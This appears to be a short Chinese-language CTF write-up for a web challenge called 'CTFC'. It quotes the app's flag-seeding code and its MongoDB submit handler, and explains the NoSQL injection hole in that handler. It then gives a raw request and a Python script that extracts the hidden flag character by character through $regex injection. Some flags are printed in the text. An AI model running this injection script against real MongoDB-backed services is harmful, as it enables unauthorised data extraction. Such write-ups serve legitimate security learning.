一道好有意思的题

先登录然后审计源码

大概就是输入了三道题

```python
def createChalls():
	db.challs.insert_one({"_id": "28c8edde3d61a0411511d3b1866f0636","challenge_name": "Crack It","category": "hash","challenge_description": "My friend sent me this random string `cc4d73605e19217bf2269a08d22d8ae2` can you identify what it is? , flag format: CTFC{<password>}","challenge_flag": "CTFC{cryptocat}","points": "500","released": "True"})
	db.challs.insert_one({"_id": "665f644e43731ff9db3d341da5c827e1","challenge_name": "MeoW sixty IV","category": "crypto","challenge_description": "hello everyoneeeeeeeee Q1RGQ3tuMHdfZzBfNF90aDNfcjM0TF9mbDRHfQ==, oops sorry my cat ran into my keyboard, and typed these random characters","challenge_flag": "CTFC{n0w_g0_4_th3_r34L_fl4G}","points": "1000","released": "True"})
	db.challs.insert_one({"_id": "38026ed22fc1a91d92b5d2ef93540f20","challenge_name": "ImPAWSIBLE","category": "web","challenge_description": "well, this challenge is not fully created yet, but we have the flag for it","challenge_flag": os.environ['CHALL_FLAG'],"points": "1500","released": "False"})

```

这里的数据库为MongoDB

然后提交flag的审核逻辑如下

```python
def submit_flag():
	_id = request.json.get('_id')[-1]
	submitted_flag = request.json.get('challenge_flag')
	chall_details = db.challs.find_one(
			{
			"_id": md5(md5(str(_id).encode('utf-8')).hexdigest().encode('utf-8')).hexdigest(),
			"challenge_flag":submitted_flag
			}
	)
	if chall_details == None:
		return "wrong flag!"
	else:
		return "correct flag!"

```

这里是有Nosql注入漏洞的

可以模拟发包

```
POST /submit_flag HTTP/2
Host: ctfc.ctf.intigriti.io
Cookie: session=eyJ1c2VyIjp7Il9pZCI6IjBmYzJjYjgzMzJmYzQzM2RhNTI4ZjA5MjBiMjA2NDA5IiwidXNlcm5hbWUiOiJjeW55NjY2In19.ZXcNGg.1qEKcMju7oguVHClOb6oaBj8LmA
Content-Length: 50
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: https://ctfc.ctf.intigriti.io
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://ctfc.ctf.intigriti.io/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Priority: u=1, i

{"_id":"_id:1","challenge_flag":"CTFC{cryptocat}"}
```

然后这里可以借助MongoDB查找数据的特性来构造

构造python脚本

```python
import requests
import string

chars = string.ascii_letters + '_{}0123456789'
url = 'https://ctfc.ctf.intigriti.io/'
cookie = {
	"session": "eyJ1c2VyIjp7Il9pZCI6IjJiNWY0ZjI5MGE4NTQ4Mzk4ZmEyNDUwY2EwY2RlN2QzIiwidXNlcm5hbWUiOiJhYmMxMjMifX0.ZVeXSQ.Tf0yIJNzUdO7HXNsIp36vpyKcTw"
}
headers = {
	'content-type': 'application/json'
}
flag = "INTIGRITI{"

while True:
	for char in chars:
		print("trying: " + char)
		json_data = {
			"_id": "_id:3", 
			"challenge_flag": {
				"$regex": f"^{flag}{char}" 
			}
		}

		r = requests.post(url + 'submit_flag', headers = headers, cookies=cookie, json=json_data)
		
		if 'correct flag' in r.text:
			flag += char
			print(flag)
			break
	if '}' in flag:
		break
```

原本想到了这里可以爆破，但是没想到爆破的方式是如此的